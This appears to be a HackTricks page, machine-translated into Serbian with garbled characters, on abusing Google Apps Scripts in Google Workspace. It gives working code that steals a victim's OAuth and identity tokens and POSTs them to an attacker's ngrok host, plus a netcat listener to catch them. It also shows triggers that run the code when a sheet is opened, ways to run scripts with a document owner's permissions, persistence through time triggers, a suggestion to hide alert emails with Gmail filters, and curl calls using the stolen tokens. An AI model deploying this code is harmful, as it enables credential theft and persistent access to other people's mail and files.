# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts je **kod koji Ä‡e se aktivirati kada korisnik sa dozvolom za ureÄ‘ivanje pristupi dokumentu sa kojim je povezan App Script** i nakon **prihvatanja OAuth prompta**.\
TakoÄ‘e se mogu postaviti da se **izvrÅ¡avaju svakog odreÄ‘enog vremena** od strane vlasnika App Script-a (Persistencija).

### Create App Script

Postoji nekoliko naÄina za kreiranje App Script-a, iako su najÄeÅ¡Ä‡i **iz Google dokumenta (bilo koje vrste)** i kao **samostalni projekat**:

<details>

<summary>Create a container-bound project from Google Docs, Sheets, or Slides</summary>

1. Otvorite dokument u Docs, tabelu u Sheets ili prezentaciju u Slides.
2. Kliknite na **Extensions** > **Google Apps Script**.
3. U editoru skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Create a standalone project</summary>

Da biste kreirali samostalni projekat iz Apps Script-a:

1. Idite na [`script.google.com`](https://script.google.com/).
2. Kliknite na **New Project**.
3. U editoru skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Create a standalone project from Google Drive</summary>

1. Otvorite [Google Drive](https://drive.google.com/).
2. Kliknite na **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Create a container-bound project from Google Forms</summary>

1. Otvorite obrazac u Google Forms.
2. Kliknite na More more\_vert > **Script editor**.
3. U editoru skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Create a standalone project using the clasp command line tool</summary>

`clasp` je alat za komandnu liniju koji vam omoguÄ‡ava da kreirate, povlaÄite/pomerate i implementirate Apps Script projekte iz terminala.

Pogledajte [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) za viÅ¡e detalja.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Create Google Sheet with App Script

PoÄnite tako Å¡to Ä‡ete kreirati App Script, moja preporuka za ovaj scenario je da kreirate Google Sheet i idete na **`Extensions > App Scripts`**, ovo Ä‡e otvoriti **novi App Script za vas povezan sa tabelom**.

### Leak token

Da biste omoguÄ‡ili pristup OAuth tokenu, potrebno je da kliknete na **`Services +` i dodate opsege kao**:

* **AdminDirectory**: Pristup korisnicima i grupama direktorijuma (ako korisnik ima dovoljno dozvola)
* **Gmail**: Da biste pristupili podacima iz gmail-a
* **Drive**: Da biste pristupili podacima iz drive-a
* **Google Sheets API**: Da bi radilo sa okidaÄem

Da biste promenili **potrebne opsege**, moÅ¾ete otiÄ‡i na podeÅ¡avanja projekta i omoguÄ‡iti: **`Show "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Da biste uhvatili zahtev, jednostavno moÅ¾ete pokrenuti:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Kada se izvrÅ¡i spoljni zahtev, OAuth prompt Ä‡e takoÄ‘e **traÅ¾iti dozvolu za pristup spoljnim krajnjim taÄkama**.
{% endhint %}

### Create Trigger

Kada se aplikacija proÄita, kliknite na **â° Triggers** da kreirate okidaÄ. Kao **funkciju** izaberite **`getToken`**, pokreÄ‡e se na implementaciji **`Head`**, u izvoru dogaÄ‘aja izaberite **`From spreadsheet`** i tip dogaÄ‘aja izaberite **`On open`** ili **`On edit`** (u zavisnosti od vaÅ¡ih potreba) i saÄuvajte.

Napomena: moÅ¾ete proveriti **izvrÅ¡enja App Scripts u tabu Executions** ako Å¾elite da debagujete neÅ¡to.

### Sharing

Da bi se **pokrenuo** **App Script**, Å¾rtva treba da se poveÅ¾e sa **Editor Access**.

{% hint style="success" %}
**Token** koji se koristi za izvrÅ¡enje **App Script** biÄ‡e onaj od **kreatora okidaÄa**, Äak i ako je datoteka otvorena kao Editor od strane drugih korisnika.
{% endhint %}

### Abusing Shared With Me documents

{% hint style="danger" %}
Ako je neko **podelio sa vama dokument sa App Scripts i okidaÄem koristeÄ‡i Head** App Script-a (ne fiksnu implementaciju), moÅ¾ete modifikovati kod App Script-a (dodajuÄ‡i, na primer, funkcije za kraÄ‘u tokena), pristupiti mu, i **App Script Ä‡e biti izvrÅ¡en sa dozvolama korisnika koji je podelio dokument sa vama**! (napomena: OAuth token vlasnika Ä‡e imati pristupne opsege koje su date kada je okidaÄ kreiran).

**ObaveÅ¡tenje Ä‡e biti poslato kreatoru skripte koje ukazuje da je neko modifikovao skriptu** (Å ta mislite o koriÅ¡Ä‡enju gmail dozvola za generisanje filtera kako bi se spreÄila upozorenja?)
{% endhint %}

{% hint style="success" %}
Ako **napadaÄ modifikuje opsege App Script-a**, aÅ¾uriranja **neÄ‡e biti primenjena** na dokument dok se ne kreira **novi okidaÄ** sa izmenama. Stoga, napadaÄ neÄ‡e moÄ‡i da ukrade token vlasnika kreatora sa viÅ¡e opsega nego Å¡to je postavio u okidaÄu koji je kreirao.
{% endhint %}

### Copying instead of sharing

Kada kreirate link za deljenje dokumenta, kreira se link sliÄan ovom: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Ako **promenite** zavrÅ¡etak **"/edit"** u **"/copy"**, umesto da mu pristupite, google Ä‡e vas pitati da li Å¾elite da **generiÅ¡ete kopiju dokumenta:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Ako korisnik to kopira i pristupi mu, i **sadrÅ¾aj dokumenta i App Scripts Ä‡e biti kopirani**, meÄ‘utim **okidaÄi nisu**, stoga **niÅ¡ta neÄ‡e biti izvrÅ¡eno**.

### Sharing as Web Application

Napomena: takoÄ‘e je moguÄ‡e **podeliti App Script kao Web aplikaciju** (u Editoru App Script-a, implementirati kao Web aplikaciju), ali Ä‡e se pojaviti upozorenje poput ovog:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

PraÄ‡eno **tipiÄnim OAuth promptom koji traÅ¾i** potrebne dozvole.

### Testing

MoÅ¾ete testirati prikupljeni token za listanje emailova sa:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendara korisnika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script kao Persistencija

Jedna opcija za persistenciju bi bila da **napravite dokument i dodate okidaÄ za funkciju getToken** i podelite dokument sa napadaÄem tako da svaki put kada napadaÄ otvori datoteku, on **izvlaÄi token Å¾rtve.**

TakoÄ‘e je moguÄ‡e napraviti App Script i postaviti ga da se aktivira svakih X vremena (kao svake minute, sata, dana...). NapadaÄ koji je **kompromitovao akreditive ili sesiju Å¾rtve moÅ¾e postaviti vremenski okidaÄ App Script-a i svaki dan izloÅ¾iti veoma privilegovan OAuth token**:

Jednostavno napravite App Script, idite na OkidaÄe, kliknite na Dodaj OkidaÄ, i izaberite kao izvor dogaÄ‘aja Vremenski okidaÄ i izaberite opcije koje vam najbolje odgovaraju:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Ovo Ä‡e kreirati email obaveÅ¡tenje o bezbednosti i push poruku na vaÅ¡ mobilni ureÄ‘aj koja vas obaveÅ¡tava o tome.
{% endhint %}

### ZaobilaÅ¾enje Nepoverljivog Upita za Deljeni Dokument

Å taviÅ¡e, ako vam je neko **podelio** dokument sa **pristupom za ureÄ‘ivanje**, moÅ¾ete generisati **App Scripts unutar dokumenta** i **VLASNIK (kreator) dokumenta Ä‡e biti vlasnik App Script-a**.

{% hint style="warning" %}
To znaÄi da Ä‡e se **kreator dokumenta pojaviti kao kreator bilo kog App Script-a** koji bilo ko sa pristupom za ureÄ‘ivanje kreira unutar njega.

To takoÄ‘e znaÄi da Ä‡e **App Script biti poveren od strane Workspace okruÅ¾enja** kreatora dokumenta.
{% endhint %}

{% hint style="danger" %}
To takoÄ‘e znaÄi da ako je **App Script veÄ‡ postojao** i ljudi su **dali pristup**, bilo ko sa **pristupom za ureÄ‘ivanje** na dokumentu moÅ¾e **modifikovati i zloupotrebiti taj pristup.**\
Da biste zloupotrebili ovo, takoÄ‘e vam je potrebno da ljudi aktiviraju App Script. Jedan pametan trik je da **objavite skriptu kao web aplikaciju**. Kada **ljudi** koji su veÄ‡ dali **pristup** App Script-u pristupe web stranici, oni Ä‡e **aktivirati App Script** (ovo takoÄ‘e funkcioniÅ¡e koriÅ¡Ä‡enjem `<img>` tagova).
{% endhint %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
